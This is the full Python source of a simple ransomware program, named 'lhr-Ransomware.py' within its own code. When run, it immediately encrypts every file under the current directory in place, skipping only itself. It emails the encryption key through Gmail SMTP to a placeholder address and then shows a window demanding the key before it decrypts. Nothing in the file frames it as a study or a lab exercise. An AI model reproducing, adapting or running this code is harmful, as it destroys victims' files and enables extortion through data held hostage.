import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

def list_files(directory):
    file_list = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_list.append(os.path.join(root, file))
    return file_list

def encrypt_files(files, key, excluded_files):
    for file in files:
        try:
            if os.path.basename(file) not in excluded_files:
                with open(file, 'rb') as f:
                    data = f.read()

                fernet = Fernet(key)
                encrypted = fernet.encrypt(data)

                with open(file, 'wb') as f:
                    f.write(encrypted)
        except Exception as e:
            print(f"Error encrypting {file}: {e}")

def send_email(gmail_user, gmail_password, to_email, key):
    to = to_email
    subject = 'Decryption Key'

    # Create message
    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = to
    msg['Subject'] = subject

    # Message body
    body = 'Decryption key: '
    msg.attach(MIMEText(body, 'plain'))

    # Attach the key directly without creating a file
    attachment = MIMEBase('application', 'octet-stream')
    attachment.set_payload(key)
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', 'attachment', filename='key.txt')
    msg.attach(attachment)
    
    # SMTP connection
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(gmail_user, gmail_password)

    # Send email
    text = msg.as_string()
    server.sendmail(gmail_user, to, text)

    server.quit()

def decrypt_files(files, key, excluded_files):
    for file in files:
        try:
            # Decrypt only if the file is not in the excluded list
            if os.path.basename(file) not in excluded_files:
                with open(file, 'rb') as f:
                    data = f.read()

                fernet = Fernet(key)
                decrypted = fernet.decrypt(data)

                with open(file, 'wb') as f:
                    f.write(decrypted)
        except Exception as e:
            print(f"Error decrypting {file}: {e}")

def encrypt_and_decrypt():
    # Current directory
    directory_to_process = '.'

    # Get the list of files within the current directory
    files_to_process = list_files(directory_to_process)

    # Files to exclude from encryption
    excluded_files = ['lhr-Ransomware.py', 'extensions.txt']

    # Generate a key
    key = Fernet.generate_key()

    # Sending the key by email
    send_email('your_email@gmail.com', 'your_password', 'recipient_email@example.com', key)

    # Encrypt files
    encrypt_files(files_to_process, key, excluded_files)

    global window
    window = tk.Tk()
    window.title("Decrypt Files")

    label = tk.Label(window, text="Enter the decryption key:")
    label.pack()

    global entry
    entry = tk.Entry(window, show='*')
    entry.pack()

    def decrypt_files_with_key():
        entered_key = entry.get()

        if entered_key == key.decode():
            decrypt_files(files_to_process, key, excluded_files)
            messagebox.showinfo("Success", "Files decrypted successfully")
            window.destroy()
        else:
            messagebox.showerror("Error", "Incorrect key")

    submit_button = tk.Button(window, text="Decrypt", command=decrypt_files_with_key)
    submit_button.pack()

    window.mainloop()

encrypt_and_decrypt()
